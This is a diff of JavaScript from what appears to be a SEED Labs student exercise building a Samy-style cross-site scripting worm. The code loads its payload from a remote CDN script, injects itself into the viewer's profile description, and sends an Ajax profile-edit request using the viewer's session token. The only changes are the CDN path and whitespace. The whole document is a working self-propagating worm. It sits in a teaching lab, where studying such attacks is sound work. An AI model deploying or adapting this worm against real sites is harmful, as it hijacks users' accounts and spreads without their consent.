@@ -6,7 +6,7 @@ window.onload = function(){
 	// 	"src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430/main/project03_task6_link3.js\">" +
 	// 	"</" + "script>");
 
-  var wormCode = encodeURIComponent("<script type=\"text/javascript\" id=\"worm\" src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430/main/project03_task6_link3.js\"></script>");
+	var wormCode = encodeURIComponent("<script type=\"text/javascript\" id=\"worm\" src=\"https://cdn.jsdelivr.net/gh/spiny-lumpsucker/cos-430@latest/project03_task6_link3.js\"></script>");
 	
 	// Set the content for the description field
 	var desc ="&description=I love Samy" + wormCode + "&accesslevel[description]=2";
@@ -21,7 +21,7 @@ window.onload = function(){
 	// Set the URL
 	var sendurl="http://www.seed-server.com/action/profile/edit";
 	var content = token + ts + name + desc + guid;
-  var samyguid = 59;
+	var samyguid = 59;
 	
 	// Construct and send the Ajax request
 	if (elgg.session.user.guid!=samyguid) {
